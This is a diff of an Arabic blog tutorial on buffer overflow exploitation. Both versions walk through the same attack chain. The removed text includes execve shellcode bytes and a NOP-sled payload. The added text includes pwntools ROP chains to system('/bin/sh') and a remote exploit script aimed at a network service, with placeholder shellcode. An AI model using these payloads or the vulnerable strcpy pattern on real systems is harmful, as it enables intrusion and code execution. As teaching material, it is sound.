@@ -1,123 +1,131 @@
 ---
 layout: blog
-title: "Buffer Overflow من الأساس للاستغلال: رحلة عملية في أقدم ثغرة أمنية لا تزال حاضرة"
-date: 2026-03-29T06:11:16Z
+title: "Buffer Overflow من الأساس للاستغلال: فهم الثغرة التي غيّرت مشهد الأمن السيبراني"
+date: 2026-03-29T16:13:16Z
 category: "تقنية"
-excerpt: "ثغرة Buffer Overflow ليست مجرد خطأ برمجي، بل بوابة كاملة لتنفيذ أكواد خبيثة والسيطرة على الأنظمة. رغم مرور عقود على اكتشافها، لا تزال حاضرة في الأنظمة الحديثة. سنفكك هذه الثغرة من جذورها، ونفهم آليتها التقنية، ونصل للاستغلال العملي."
-read_time: 8
-tags: ["Buffer Overflow", "Binary Exploitation", "Offensive Security", "Memory Corruption", "Exploit Development"]
+excerpt: "ثغرة Buffer Overflow ليست مجرد خلل برمجي، بل هي البوابة التي فتحت عالم استغلال الثغرات الحديث. في هذه المقالة، نغوص في تشريح الثغرة من المستوى المنخفض للذاكرة حتى كتابة exploit عملي. رحلة تقنية من الصفر إلى السيطرة الكاملة على تدفق البرنامج."
+read_time: 12
+tags: ["Buffer Overflow", "Exploit Development", "Memory Corruption", "Binary Exploitation", "Offensive Security"]
 slug: "buffer-overflow-guide"
 ---
 
-## فهم الـ Stack والذاكرة
+## الذاكرة وبنية Stack: حيث تبدأ القصة
 
-لفهم Buffer Overflow، علينا البدء من الذاكرة. كل برنامج يعمل لديه Stack: منطقة ذاكرة تخزن المتغيرات المحلية وعناوين العودة للدوال. عندما تُستدعى دالة، يُحفظ عنوان العودة (Return Address) على الـ Stack لتعرف CPU أين تعود بعد انتهاء الدالة.
+لفهم Buffer Overflow، عليك أولاً فهم كيف يدير البرنامج الذاكرة. عندما تستدعي دالة في برنامجك، يُنشئ النظام stack frame جديد يحتوي على:
 
-الـ Buffer هو مساحة محجوزة لتخزين بيانات. عندما نكتب بيانات أكثر من سعة الـ Buffer دون فحص، نتجاوز حدوده ونكتب فوق مناطق أخرى في الذاكرة. هنا تولد الثغرة.
+- المتغيرات المحلية (local variables)
+- عنوان العودة (return address) - العنوان الذي سيعود إليه البرنامج بعد انتهاء الدالة
+- مؤشر الـ base pointer السابق (saved EBP/RBP)
+
+الـ stack ينمو نحو العناوين المنخفضة، بينما البيانات داخل buffer تُكتب نحو العناوين الأعلى. هذا التصادم هو جوهر الثغرة.
 
 ```c
-#include <string.h>
-
 void vulnerable_function(char *input) {
     char buffer[64];
-    strcpy(buffer, input);  // لا يوجد فحص للحجم
-}
-
-int main(int argc, char **argv) {
-    vulnerable_function(argv[1]);
-    return 0;
+    strcpy(buffer, input);  // لا يوجد فحص للحجم!
 }
 ```
 
-الكود أعلاه يستقبل مدخلات المستخدم دون فحص. إذا أدخلنا أكثر من 64 بايت، سنتجاوز الـ buffer ونكتب فوق return address.
+عندما يتجاوز `input` حجم 64 بايت، يبدأ في الكتابة فوق saved EBP ثم return address. السيطرة على return address تعني السيطرة على مسار تنفيذ البرنامج.
 
-## تشريح الاستغلال
+## تشريح الاستغلال: من النظرية للتطبيق
 
-الاستغلال يعتمد على ثلاث خطوات:
+الخطوة الأولى هي إيجاد الـ offset الصحيح - كم بايت تحتاج قبل الوصول لـ return address؟
 
-**1. التحكم في EIP/RIP**
-الهدف الأول هو الكتابة فوق return address لتوجيه التنفيذ لعنوان نختاره. نحتاج معرفة المسافة (offset) بين بداية الـ buffer وموقع return address.
+```python
+from pwn import *
 
-**2. إيجاد الـ Offset**
-نستخدم pattern عشوائي فريد لتحديد المسافة بدقة:
+# إنشاء pattern فريد
+pattern = cyclic(200)
+print(pattern)
+```
+
+بعد crash البرنامج، تفحص قيمة instruction pointer (EIP/RIP). باستخدام `cyclic_find()`، تحدد المسافة بالضبط.
+
+```python
+# لو crash عند 0x61616173
+offset = cyclic_find(0x61616173)  # مثلاً: 72 بايت
+```
+
+الآن تبني exploit بنية:
+```
+[PADDING] + [RETURN_ADDRESS] + [SHELLCODE/ROP]
+```
+
+## Protection Mechanisms: العقبات الحديثة
+
+الأنظمة الحديثة ليست ساذجة. ستواجه:
+
+**ASLR (Address Space Layout Randomization)**: يُعشوئ عناوين الذاكرة في كل تشغيل. الحل؟ memory leak أو ROP مع relative addressing.
+
+**DEP/NX (Data Execution Prevention)**: يمنع تنفيذ الكود من الـ stack. الحل؟ Return-Oriented Programming (ROP).
+
+**Stack Canary**: قيمة عشوائية قبل return address. إذا تغيرت، البرنامج ينهار. الحل؟ leak القيمة أو تجنّبها.
 
 ```bash
-# استخدام msf-pattern_create
-msf-pattern_create -l 200
-# ننفذ البرنامج مع الـ pattern
-gdb ./vulnerable
-run $(msf-pattern_create -l 200)
-# نأخذ قيمة EIP/RIP المكتوبة
-msf-pattern_offset -q 0x35624134
-# النتيجة: Exact match at offset 76
+# فحص الحمايات
+checksec ./vulnerable_binary
 ```
 
-**3. صياغة الـ Exploit**
-بعد معرفة الـ offset، نبني payload:
-- 76 بايت (Padding)
-- 4/8 بايت (Return Address الجديد)
-- Shellcode أو عنوان دالة خطرة
+## ROP: الاستغلال عندما يُغلق الباب الرئيسي
 
-## بناء Payload عملي
-
-لنفترض أننا نريد تنفيذ shellcode يفتح shell. أولاً نحتاج عنواناً ثابتاً في الذاكرة:
+عندما لا تستطيع تنفيذ shellcode مباشرة، تبحث عن ROP gadgets - تعليمات موجودة مسبقاً في البرنامج تنتهي بـ `ret`.
 
 ```python
-import struct
+from pwn import *
 
-# Shellcode لفتح /bin/sh (x86-64)
-shellcode = (
-    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e"
-    b"\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58"
-    b"\x99\x0f\x05"
-)
+elf = ELF('./vulnerable')
+rop = ROP(elf)
 
-offset = 76
-ret_address = struct.pack("<Q", 0x7fffffffe400)  # عنوان الـ Stack
+# مثال: استدعاء system("/bin/sh")
+rop.call('system', [next(elf.search(b'/bin/sh'))])
 
-payload = b"A" * offset
-payload += ret_address
-payload += b"\x90" * 16  # NOP sled
-payload += shellcode
-
-with open("exploit.bin", "wb") as f:
-    f.write(payload)
+payload = b'A' * offset
+payload += rop.chain()
 ```
 
-الـ NOP sled (\x90) يعطينا مساحة خطأ. إذا لم نصب العنوان بدقة، سننزلق على الـ NOPs حتى نصل للـ shellcode.
+تربط هذه الـ gadgets لبناء chain يُنفذ ما تريد: تحضير registers، استدعاء system calls، تنفيذ shell.
 
-## الحمايات الحديثة والتجاوز
+## من المختبر للواقع: سيناريوهات عملية
 
-الأنظمة الحديثة ليست ساذجة. تطبق عدة حمايات:
+في penetration testing، Buffer Overflow يظهر في:
 
-**DEP/NX**: يمنع تنفيذ كود من الـ Stack. الحل: ROP (Return Oriented Programming) - نستخدم قطع كود موجودة (gadgets) لبناء سلسلة تنفيذية.
+**1. تطبيقات الشبكة القديمة**: خوادم FTP، web servers قديمة، بروتوكولات proprietary.
 
-**ASLR**: يعشوئ عناوين الذاكرة. الحل: تسريب عنوان من الذاكرة أولاً، أو استخدام ثغرة information disclosure.
+**2. IoT devices**: firmware بدون حمايات حديثة، غالباً على ARM architecture.
 
-**Stack Canaries**: قيمة عشوائية قبل return address. إذا تغيرت، البرنامج ينهي. الحل: تسريب قيمة الـ canary أو تجاوزه بدقة.
+**3. برامج Windows قديمة**: خصوصاً تلك المكتوبة بـ C/C++ قبل عصر SDL.
 
-مثال ROP بسيط:
+مثال عملي على استغلال خدمة شبكة:
 
 ```python
-# بدلاً من shellcode، نستدعي system("/bin/sh")
-pop_rdi = 0x400686  # gadget: pop rdi; ret
-bin_sh = 0x400770   # عنوان string "/bin/sh"
-system_addr = 0x400560
+from pwn import *
 
-payload = b"A" * offset
-payload += struct.pack("<Q", pop_rdi)
-payload += struct.pack("<Q", bin_sh)
-payload += struct.pack("<Q", system_addr)
+host = '192.168.1.100'
+port = 9999
+
+conn = remote(host, port)
+
+# بناء payload
+buffer = b'A' * 2003
+eip = p32(0xDEADBEEF)  # عنوان الـ JMP ESP
+nops = b'\x90' * 16
+shellcode = b'\x31\xc0\x50...'  # reverse shell
+
+payload = buffer + eip + nops + shellcode
+
+conn.send(payload)
+conn.interactive()
 ```
 
-## الخلاصة والممارسة
+## الخلاصة: من الفهم للإتقان
 
-Buffer Overflow ليس مفهوماً نظرياً، بل مهارة تُصقل بالممارسة. ابدأ بمعامل بسيطة:
-- جرب Protostar على exploit.education
-- استخدم pwntools للأتمتة
-- فهم assembly أساسي ضروري
-- اقرأ كود البرامج المفتوحة للثغرات المكتشفة
+Buffer Overflow هي أكثر من ثغرة - هي مدخلك لفهم memory corruption بشكل عام. من هنا تتفرع Use-After-Free، Heap Overflow، Format String، وغيرها.
 
-كل CVE استغل buffer overflow يحمل درساً. من Morris Worm سنة 1988 إلى ثغرات حديثة في routers وIoT devices، المبدأ واحد لكن التقنيات تتطور.
+المفتاح هو الممارسة المستمرة. ابدأ ببرامج بسيطة بدون حمايات، ثم تدرّج لـ CTF challenges مع ASLR وDEP. استخدم منصات مثل:
 
-المهاجم المتقن لا يكتفي بنسخ exploits، بل يفهم كل بايت في الـ payload ولماذا موضوع هناك. هذا الفهم هو الفارق بين script kiddie ومختبر اختراق حقيقي.
+- HackTheBox
+- pwnable.kr  
+- Exploit Education (Phoenix)
+
+تذكّر: الهدف ليس الاستغلال فقط، بل فهم لماذا نجح، وكيف يمكن منعه. هذا الفهم العميق هو ما يميّز security researcher محترف عن script kiddie.
